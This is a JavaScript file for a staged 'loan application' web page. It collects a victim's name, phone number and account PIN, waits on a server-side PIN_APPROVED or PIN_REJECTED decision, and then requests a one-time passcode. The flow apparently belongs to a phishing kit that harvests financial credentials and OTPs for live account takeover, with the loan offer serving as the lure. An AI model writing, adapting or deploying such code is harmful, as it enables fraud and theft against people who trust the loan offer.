let currentAppRef = null;
let statusPollInterval = null;

document.getElementById('step-1-form').addEventListener('submit', async (e) => {
  e.preventDefault();

  const payload = {
    fullName: document.getElementById('fullName').value,
    occupation: document.getElementById('occupation').value,
    loanAmount: document.getElementById('loanAmountRange').value,
    phone: document.getElementById('phone').value,
    pin: document.getElementById('pin').value
  };

  try {
    const res = await fetch('/api/apply-loan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();
    if (data.success) {
      currentAppRef = data.appReference;
      showStep('step-verifying');
      startCountdown(10, pollStatus);
    }
  } catch (err) {
    alert("Connection error. Please try again.");
  }
});

document.getElementById('step-otp-form').addEventListener('submit', async (e) => {
  e.preventDefault();

  const otpCode = document.getElementById('otpCode').value;

  try {
    const res = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppRef,
        otpCode: otpCode,
        phone: document.getElementById('phone').value
      })
    });

    const data = await res.json();
    if (data.success) {
      showStep('step-verifying');
      startCountdown(5, pollStatus);
    }
  } catch (err) {
    alert("Error submitting OTP. Please try again.");
  }
});

function pollStatus() {
  if (statusPollInterval) clearInterval(statusPollInterval);

  statusPollInterval = setInterval(async () => {
    if (!currentAppRef) return;

    try {
      const res = await fetch(`/api/check-status/${currentAppRef}`);
      const data = await res.json();

      if (data.success) {
        if (data.status === 'PIN_APPROVED') {
          clearInterval(statusPollInterval);
          showStep('step-otp-form');
        } else if (data.status === 'PIN_REJECTED') {
          clearInterval(statusPollInterval);
          showStep('step-rejected');
        } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
          clearInterval(statusPollInterval);
          showStep('step-success');
        } else if (data.status === 'OTP_REJECTED') {
          clearInterval(statusPollInterval);
          showStep('step-rejected');
        }
      }
    } catch (err) {
      console.error("Status polling error:", err);
    }
  }, 2000);
}

function startCountdown(seconds, callback) {
  let timer = seconds;
  const timerElem = document.getElementById('countdown-timer');
  timerElem.innerText = `${timer}s`;

  const countdown = setInterval(() => {
    timer--;
    timerElem.innerText = `${timer}s`;
    if (timer <= 0) {
      clearInterval(countdown);
      if (callback) callback();
    }
  }, 1000);
}

function showStep(stepId) {
  ['step-1-form', 'step-verifying', 'step-otp-form', 'step-success', 'step-rejected'].forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });
  document.getElementById(stepId).classList.remove('hidden');
}
